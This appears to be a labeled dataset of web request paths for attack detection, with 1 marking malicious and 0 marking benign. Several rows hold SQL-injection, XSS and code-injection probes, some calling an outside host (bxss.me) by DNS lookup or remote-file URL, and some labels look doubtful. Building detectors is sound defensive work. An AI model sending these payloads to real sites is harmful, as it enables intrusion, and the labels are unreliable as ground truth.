request	label
/*******/8z4fls.php	1
/****/category/fengxianfangfan?page=1' or 0889=5100 /*	1
/******/system/2020/01/30/013066679.shtml	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u4ebf\u5bb6\u9999\u9910\u9986	0
/****/zgsdt/2021_qydt/202101/w020210128396848080112.jpg	0
/**********/system/2021/12/08/013491641.shtml	0
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/**********/system/2021/09/07/013447024.shtml	0
/*****/gjcp/gcjx/bqsm/gygj/jtgg/gjglry/yqlj/xwzx/mtgz/2021_mtgz/202103/xxgk/qyzdsx/kjcx/kycg/kjjl/	0
/*******/837554.html	0
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp	1
/**/system/2021/11/24/012225051.shtml	0
/******/system/2016/10/07/javascript:window.close();	1
/***/0/01/39/89/1398958_873635.jpg	0
/****/bmkx/ggjyzx/202108/w020210810662502258586.jpg	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u798f\u5ba2\u6765\u996d\u9986	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqxcb/201708/t20170818_549626.html	0
/***/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg	1
/xwdt'||'/****/jhcw/gzdt.htm	1
/****/zgsdt/2020_qydt/202004/t20200428_246385.html	0
/*****/h1614136598.html	0
/***/misc-ping.html	0
/*****/system/2020/09/11/javascript:void(0);	1
/******/user/gallery1.php?g_name=<script>alert(77729</script>	1
/****/zfxxgk1/if(now()=sysdate(),sleep(12),0).htm	1
"/*/170822-'""""()&%<acx><script >rcwk(9465)</script>/index/06defa41f3b0c6ebc8da65f95d7f2f20.css"	1
/****/gfxwj/202003/t20200330_2005727.html	0
/****/	0
/******/usercenter/index?qrcode=91439&code=031zwykl2vytj84ndwnl2i7tiw1zwykw	0
/****/zt/msss/msxw/201907/t20190725_1628867.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u99a8\u6021\u7f8e\u5bb9\u4f1a\u6240	0
/****/zgsdt/zgs16/201609/t20160930_102377.html	0
/****/bmkx/jkzx/202107/w020210719645802415543.jpg	0
"/************/template/jcse/110105008056111/16/"""" """"a"""".concat(70-3).concat(22*4).concat(107).concat(83).concat(121).concat(80) (require""""socket""""
socket.gethostbyname(""""hitgy"""" """"iqyspgfs62550.bxss.me."""")[3].to_s) """"/plugin/voice/hzrecorder.js"	1
/****/xqldly/hfhnsj/zmhdyc_1.html	0
/********/gjjtwzq/nbfw/ywzzq/qtyz/ywly/xwzx/szyw/gygj/dszzc/ddjs/jjgz/kjcx/kjdt/	0
/****/zzxxgk/jjhzj/gyjzq/gyjzq_3662	0
/****/xh/hy/202009/t20200930_2248069.html	0
/****/byszf/sz/202108/t20210806_http://bxss.me/t/fit.txt.html	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6625\u82b1\u9053\u8def\u8d27\u7269\u8fd0\u8f93\u90e8	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u7267\u76db\u519c\u7267\u751f\u6001\u519c\u4e1a\u6709\u9650\u516c\u53f8	0
/****/20200617/e102407614.html	0
/***/com/menu/images/file.gif	0
/****/web/search?searchword=1%' or 7659=7764 /*&channelid=287219&perpage=24&templet=1&token=1	1
"/****/xxgknb/2013/list.html?new='""""()&%<acx><script >j2by(9349)</script>"	1
/*******/qjf7vf.php	1
/******/2020xxqg.png	0
/*******/qiye/b-e1019887.html	0
/******/dsjy	0
/****/ljbwlaqds/zxdt/index.shtml	0
//***********/html/demo12.html	1
/***/interface/comul_total.json.jsp?callback=jquery11110055846515032996535_1639972902424	0
/****/web/search?channelid=299868') and 2687=2687	1
/**********/system/2020/04/19/013143870.shtml	0
/****/ygzpxx/201810/t20181031_194422.html' and 'x'='x	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u6c47\u4e30\u697c\u9910\u5385	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u6731\u6b23\u6b23\u5546\u5e97	0
/if(now()=sysdate(),sleep(12),0)/******/ncwywfgz/1.htm	1
"/**/server/news/show/title/""><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/****/202105/t20210526_274622.html	0
/**/system/2021/12/21/012232219.shtml	0
/***/mavideo/gvideos.php?gid=1 and 1=1	1
/****/bwcx/dtbb/jtdt/201911/t20191121_238445.html	0
"/******/help/search.php?query=""""onmouseover=""""alert(1);"	1
/****/xqdt/jtx/201610/t20161025_44144.html	0
/**********/system/2020/05/21/013167075.shtml	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202103/t20210329_179045.html	0
/**********/system/2021/04/20/013371555.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u660e\u626c\u5c0f\u5403\u5e97	0
/******/usercenter/index?qrcode=quicklyrq,3,31304,850039	0
/****/xh/hy/201708/t20170824_458669.html	0
/***/0/00/29/74/297463_267889.jpg	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/list_3.html	0
/zwxx_11337/****/202011/t20201110_2332909.html	0
/**/ae554p.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e00\u6069\u4f9d\u52a0\u4e00\u6069\u4f9d\u978b\u5e97	0
/***/com/ysb/yl.css	0
/*******/qiye/e142323372.html	0
/******/system/2020/10/01/javascript:void();	1
/****/202109/t20210907_3007491.html	0
/****/web/search?channelid=222832&searchword=); waitfor delay '0:0:2	1
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqzzb/index_1.html	0
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=shitishangye¤tpage=1	0
/*******/202106/202106031045061076.html	0
/****/xqptlj/list.html?new=0.7585576112141312	0
/****/zfxxgk/fdzdgknr/ghxx/zxgh/202001/t20200106_1915136.html	0
/**/zp-core/admin-upload.php?error=<script>alert(777)</script>	1
/************/template/jcse//xfs.bxss.me/16/images/catesearchbtn.js	1
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u8054\u8d22\u5fb7\u9f99\u8d85\u5e02	0
/**********/system/2020/05/13/013160868.shtml	0
/****/web/search?page=256&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/zwxx_11337/****/201705/w020170728413620200767.jpg	0
/*****/gy42/cpgyss.asp?key=\u8f66\u95f4\u5382\u623f\u9664\u5f02\ufffd?ig=3&l2=\ufffd\ufffd\u052a&l=\ufffd\u0134\ufffd	0
/**/products/	1
/*******/zwgk/czgk/bmyjs/zzqjcyxt/sqcdqrmjcy/	0
/**/mh/images/mh.gif	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448' or 3359=2140 and '1'='1	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u795e\u519c\u6d4e\u4e16\u79cd\u690d\u4e13\u4e1a\u5408\u4f5c\u793e	0
"/***/col40/index.html/<img src=""javascript:alert(930)"">"	1
/****/zzxxgk/swj/swjysqgk/gkcx	0
/**********/system/2020/12/20/013305634.shtml	0
/****/xxgkml/rsrm/202103/t20210303_178088.html	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5065\u8eab\u5e73\u53f0	0
/***/0/01/87/75/1877573_988683.jpg	0
/****/201909/t20190926_1757376.html	0
/****/yzw/ldyl	0
/******/2016/common.files/wb.png	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtlfkd57ypcb8cb0ifd4ek/m=&openid=ovl7jjknvdh7txdcfdxwiri5-vxs&outer_str=quicklyrq,3,18239,10321281&activate_ticket=fdzv9emqaffrnr3xboqhb1vdattse0yu537vnyavottoo8dbj5 fzedtzplsmcartcbkdjnftpbe1nhqbtysidf   tvlv2sys52p13euew=	0
/****/bmkx/sswj/202112/w020211204356654569870.jpg	0
/***/0/01/77/22/1772294_591399.jpg	0
/***/003/004/237/00300423770_fc3db9a5.jpg	0
/****/javascript:void(0);	1
/******/tkysj/images/a.gif	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5929\u5b87\u5957\u88c5\u95e8\u7ecf\u9500\u90e8	0
/**/news/xwygx/201912/w020191219608450723245.jpg	0
/****/system/2021/07/21/javascript:window.close();	1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202105/w020210510327175263287.png	0
/**********/system/2021/08/02/013429065.shtml	0
/**********/system/2021/12/17/013495699.shtml	0
/****/if(now()=sysdate(),sleep(12),0)/czjs/gzdt.htm	1
/*****/system/2021/12/14/javascript:window.print()	1
/******/resource'||'/js/vsb_news_search_entry.js	1
/***/0/00/42/07/420710_887823.jpg	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u5174\u5b81\u7535\u5668\u7ecf\u9500\u90e8	0
/**********/system/2020/03/17/013117432.shtml	0
/****/bmkx/sfgw/201610/t20161025_14243.html	0
/****/web/search?channelid=222832&searchword=\u9686\u6e56\u673a\u68b0\u52a0\u5de5\u5382	0
/****/zfwjn/201810/t20181029_111100_wap.html	0
/************/template/jcse/110105008056111/16/images/plugin/voice'||'/voice.css	1
/***/minip/mama/cs-2.png	0
/*****/20200811/javascript:void(0);	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u65b0\u80dc\u6797\u6e90\u6587\u5316\u7528\u54c1\u7ecf\u9500\u90e8	0
/*******/qiye/b-e2431458.html	0
/**********/system/2020/06/12/013184026.shtml	0
"/****/czgk/bmyjs/rmtt/ql/\""javascript:void(0)\"""	1
/****/category/zixunfuwu?page=1' or 5708=5708 /*	1
/******/system/2021/04/06/013364202.shtml	0
"/****/gg/""><script>alert(306)</script>"	1
"/****/xxgkml/rsrm/list.html?new=0.5540579994588073'""""()&%<acx><script >k1by(9599)</script>"	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtmozqu2lsrxbgtevoxnx6ge=&openid=ovl7jjsts4simpbbfgnjhh9vygxw&outer_str=quicklyrq,2,0,10385316&activate_ticket=fdzv9emqaffrnr3xboqhb tguvadbpt6vy7k5cm1dfpoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi6c2mrem6ivvdidrxk9swmo=	0
/***/0/02/03/55/2035566_774064.jpg	0
/***/viewspace-904.html	0
/**********/system/2021/10/14/javascript:window.print()	1
/zwxx_11337/****/201707/t20170727_300501.html	0
/****/zzxxgk/http://bxss.me/t/fit.txt?.jpg/zfxxgkml_2127/xwfbh_2065/list.html	1
/******/visitcount/visit.jsp?type=3&i_articleid=239572&i_columnid=37&i_webid=1' and 'x'='x	1
/**/system/2020/05/27/011997253.shtml	0
/***/ebs_sub6.cgi	1
/zwxx_11337/****/201401/t20140115_312012.html	0
/script%' and 2*3*8=6*8 and 'j6w2'!='j6w2%/*/1905211146429566.js	1
/****/ghgz/202106/t20210616_293844.html	0
/*******/qiye/b-e2383147.html	0
"/****/abantecart/index.php?rt=product/manufacturer&manufacturer_id=15""><script>alert(777);</script>"	1
/**********/system/2020/06/07/013179641.shtml	0
/******/system/2010/11/17/010234779.shtml	0
/****/zxxx/content.html?metadataid=10062460	0
"/***/getlist?data={""page_size"":20,""channel_type"":4,""channel_id"":12516}"	0
/****/gjzqq/index.html?continent=%') or 1182=1182 and '%'='	1
/***/003/004/506/00300450641_84bbbd85.png	0
/****/system/2020/12/01/javascript:window.close();	1
/***/0/01/61/24/1612437_419938.jpg	0
/******/resource/js/newcalendar/wdatepicker'||'.js	1
/***/jt/jzxy/images/12.jpg	0
/******/system/2018/02/04/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u767b\u4fe1\u5c0f\u5356\u90e8	0
/****/zzxxgk/tjj/zfxxgkml_http://bxss.me/t/fit.txt/jgzn_2042/list.html	1
"/****/form.jspx?id="";window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()""&channelid=1542"	1
/***********/zaojianpinglun/?_=1640035448366	0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/csjs/zcwj/1.htm	1
/***/0/00/22/65/226504_117661.jpg	0
/******/download/downfile.jsp?classid=0&filename=06c080ad774b497c8312530658e028b8.doc%' and 1=1 and '%'='	1
/****/bank-index.jsp?tjr=t013192	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u82b3\u82b3\u5973\u88c5\u5e97	0
/*********/appimage/\u914d\u8d27\u68c0\u67e5.png	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u535a\u8baf\u8054\u8fbe\u624b\u673a\u7ef4\u4fee\u90e8	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u745e\u901a\u8fbe\u8d38\u6613\u4e2d\u5fc3	0
/****/xef/sp_1296/201801/t20180117_670767.html	0
/******/system/2020/08/12/013224960.shtml	0
/****/20161202/2373.html	0
/****************/notification/negotiate?access_token=ae67cbe2-11a2-4bb0-85bb-c9d81fb3fcad	0
/****/bmkx/sgaj/201808/w020180806604828489919.jpg	0
/****/gcspzdgg%' and 2*3*8=6*8 and 'qtqn'!='qtqn%.htm	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u67b8\u5a03\u70df\u9152\u526f\u98df\u5e97	0
/*******/ov8kl.php	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u767d\u798f\u6d9b\u624b\u5de5\u51c9\u76ae\u5e97	0
/**********/system/2021/08/26/013440252.shtml	0
/****/gjcp/lyjx/ddjs/dqgz/kjcx/kycg/ywly/gccb/gcjsgc/	0
/*****/ywly/zbyfyzz/qtyz/gygj/dszzc/xwzx/rwfc/wzdt/rlzy/images/jquery-1.7.1.min.js	0
/******/system/2016/11/03/javascript:void(0);	1
/****/system/2020/04/03/javascript:window.print()	1
/***/0/01/92/25/1922547_629531.jpg	0
/****/2020wzqh/wzqh_zyjs/' and 'x'='y	1
/*******/qiye/1hxapy_80_e143331012.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtpmvomuumxop0ngigi1zwse=&openid=ovl7jjn0lymbb2nnnzuxncelbrv8&outer_str=7181&activate_ticket=fdzv9emqaffrnr3xboqhb1juhhw5varfjewq9jtpeudoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi/lctu47 q325n1jgtjklco=	0
/****/zxft/index_7.html	0
/*****/gy42/ljcpgyview.asp?id=29512600&l2=\ufffd\ufffd\ufffd\ufffd&l=\u027d\ufffd\ufffd	0
/****//828/j6u78dwl/xhr_send?t=1632366661108	1
/******/qhkc/jh	0
/****/whs/yw_1286/201701/t20170118_314544.html	0
/****/bmkx/bygxqgwh/202112/t20211210_197675.html	0
/*******/r92j738.php	1
/****/qtgz/index_1.html	0
/**********/system/2021/08/20/013437719.shtml	0
"/****/zfwjn/"""" """"a"""".concat(70-3).concat(22*4).concat(111).concat(74).concat(113).concat(65) (require""""socket""""
socket.gethostbyname(""""hitfl"""" """"kiaadwwz01110.bxss.me."""")[3].to_s) """"/1081/list.html"	1
/images'||'/*/xys.css	1
/*****/system/2021/12/08/013491810.shtml	0
/****/system/2020/10/29/012082926.shtml	0
/****/202109/t20210930_3069593.html	0
/zwxx_11337/****/202006/t20200624_2145388.html	0
/*******/qiye/b-e1834065.html	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202111/t20211122_196786.html	0
/*****/mavideo/gvideos.php?gid=1 and 1=2	1
/**/system/2021/05/21/012162461.shtml	0
/******/resource/code/news/click/clicktimes.jsp?wbnewsid=67340&owner=1329914701&type=wbnewsfile&randomid=nattach	0
/**********/system/2021/11/11/013478316.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4e01\u6653\u7434\u62c9\u9762\u9986	0
/*/public/viewclick/?addclick=1&classid=243&id=1 waitfor delay '0:0:10.431' --	1
/*******/qiye/businesses-e23331.html?category_id=143946	0
"/****/category/zhengcegoutong?page=*/-->'""""></iframe></script></style></title></textarea><script >alert(04321)</script>"	1
/****/bmkx/jyj/202007/w020200703725181841689.jpg	0
"/****/files.php?folder="""">alert(777)"	1
/***/xm/menu/images/xianjin.gif	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrto1wavxzgczqpdn3i8b3bcm=&openid=ovl7jjpdwxqxcepdnluldvjecyca&outer_str=qrscene_mcs,1,78414,149719&activate_ticket=fdzv9emqaffrnr3xboqhbywde3wuyru5temy2aghexpoo8dbj5 fzedtzplsmcarprw0rjkjsoxgv/3pxbfq5k3no56sg3dz estbvymbmc=	0
/****/system/2013/11/20/011238243.shtml	0
"/******/server/news/show/title/time-for-a-heavy-harvest-new-release/src/""><script>alert(777)</script>@random4cd201e063d5c"	1
/*****/gy48/cpgyss.asp?key=\u052d\u05f0\ufffd\ufffd\u01ef&l=\ufffd\ufffd\ufffd\ufffd	0
/****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/vc' and 2*3*8=6*8 and 'rd2t'='rd2t/**/lib/security/crypto-js.js	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9999\u8349\u86cb\u7cd5\u623f	0
/*******/exmppqjk.php	1
/**/system/2021/09/15/012200518.shtml	0
/***/getsubject?vno=3.5.0×tamp=1640053497973&	0
/****/system/2021/11/18/012223865.shtml	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u9152\u91cc\u6709\u97f3\u4e50\u4f1a\u6240	0
/******/sjd/javascript:void(0)	1
"/****/zfwjn'""""()&%<acx><script >ij8q(9301)</script>/1088/1104/list.html"	1
/****/zgsdt/2021_qydt/202111/kjcx/xyfw/jcjg/	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u9a6c\u83f2\u8fb0\u6570\u6613\u6587\u5316\u54a8\u8be2\u670d\u52a1\u4e2d\u5fc3	0
/***/0/02/12/41/2124156_897469.jpg	0
/****/whs/yw_1286/202009/t20200911_2229979.html	0
/*****/003/004/504/00300450464_vw00000000000001_380b509d.mp4	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(6291)"">?_=1630312283968"	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4f01\u4e1a	0
/******/resource/js/newcalendar'||'/my97datepicker.htm	1
"/**/jspmyadmin/tabledata.jsp?server=localhost&db=mysql&table=""""/>alert(777);"	1
/****/20200824/e105557391.html	0
/**********/system/2020/05/12/013159950.shtml	0
/__media__/**/netsoltrademark.php?d=news-slut-here.buzz/1760	0
/*******/zwgk/czgk/bmjs/sydw1/tb/	0
/****/system/2020/07/03/013198428_01.shtml	0
/****/20201115/e110080059.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u539f\u6c41\u539f\u5473\u65e9\u9910\u5e97	0
"/****/web/search?page=2&channelid=253477&searchword=1&keyword=*/-->'""""></iframe></script></style></title></textarea><script >alert(66057)</script>&orderby=-docreltime&perpage=15&outlinepage=10"	1
/*******/	0
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqswt/201708/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u7231\u65af\u82ad\u8482\u5976\u8336\u5e97	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u8f69\u8f69\u978b\u884c	0
/zwxx_11337/****/202004/t20200430_2053409.html	0
/****/100.html	0
/****/tzgg/202109/t20210928_3060287.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5473\u7edd\u4f20\u5947\u79d8\u6c41\u9ebb\u8fa3\u70eb\u71d5\u7fd4\u5bb6\u56ed\u5e97	0
/****/jtdt/2020_jtyw/202008/w020200831291731789953.jpg	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u9a6c\u897f\u8089\u98df\u5e97\u4e00\u5206\u5e97	0
/*****/b-e940841.html	0
/***/0/01/46/96/1469676_308159.jpg	0
/***/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777)	1
/****/system/2016/11/10/javascript:window.print()	1
/***/blockdata/getsearchinfo.do?&title=\u58f6	0
/****/system/2020/12/03/javascript:dozoom(9)	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u7199\u7f8e\u4f73\u7ef4\u767e\u8d27\u91d1\u51e4\u4e07\u8fbe\u5e97	0
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u674e\u5c0f\u519b\u6c7d\u8f66\u4fee\u7406\u90e8	0
/****/20160928/javascript:void(0);	1
/zwxx_11337/****/202006/t20200616_2139242.html	0
/****/css/chunk-e3472e92.27c105b1.css	0
"/************/template/jcse/"""" """"a"""".concat(70-3).concat(22*4).concat(98).concat(81).concat(102).concat(87) (require""""socket""""
socket.gethostbyname(""""hitky"""" """"wvskrjgl6b8f5.bxss.me."""")[3].to_s) """"/16/images/searchbtn.js"	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u67d4\u8fdc\u9547\u6e05\u9999\u6e90\u519c\u5e84	0
/***********/zaojianpinglun/?_=1640025436941	0
/**********/system/2021/12/20/013496894.shtml	0
/***/0/02/08/60/2086064_798574.jpg	0
/*******/qiye/b-e810334.html	0
/****/xqdt/jtx/201910/t20191011_142976.html	0
/*********/index_11.html	0
"/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="""">alert(/777/)&false_positives=without&sort=&asc=false&commit=search"	1
/****/xxgknb/	0
/*******/834555.html	0
/***/receivable/receivablelist?page=1&limit=100&accountage=&deptname=130040803	0
/**********/system/2021/07/01/013411501.shtml	0
/zwxx_11337/****/202003/t20200325_2001385.html	0
/****/system/2021/12/19/012231883.shtml	0
/******/resource'||'/js/counter.js	1
/****/wdszs/hfsz/202004/t20200408_150489_wap.html	0
/**********/2021-12-31.html	0
/****/czgk/bmjs/gmzdp/zzqngd/201808/t20180816_977557.html	0
/******/appweb.do?method=appdatadetail&groupid=293&appid=348&dataid=70092	0
/****/xxgkml/qtfdxx/zcjd/szcjd/202105/t20210511_182387.html	0
/****/mtgz/2012mtgz/201412/t20141218_44667.html	0
/*****/phppressrelease/administration.php?pageaction=saverelease&subaction=submit&dateday=&datemonthnewedit=&dateyearnewedit=&title=<script>alert('777')</script>&summary=deneme&releasebody=deneme&categorynewedit=1&publish=active	1
/****/xqdt/hnx/201610/t20161025_50922.html	0
/****/qzfwj/201801/t20180115_669320.html	0
/****/web/search?searchword=1&perpage=24&templet=1&token=1	1
/**************/cms/cms/gobottom.do?urlname=8f1c5a0d82c44f0da018e67dd5bea811	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u542f\u751f\u6e90\u836f\u4e1a\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqzfwdwzcyjs_1816/201808/t20180816_977852.html	0
/******/system/2011/09/06/010459693.shtml	0
/zwxx_11337/***/201805/t20180527_767879.html	0
/****/qzfwj/201801/t20180115_668730.html	0
/****/bmkx/scl/202107/w020210716376294496215.png	0
"/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/"""".gethostbyname(lc(""""hitix"""".""""cavwndqw61472.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(116).chr(82).chr(114).chr(80)."""".html"	1
/****/xqdt/index_4.html	0
/****/web/search?perpage=20&outlinepage=10' waitfor delay '0:0:2&keyword=1&channelid=240998&searchword=1&page=10	1
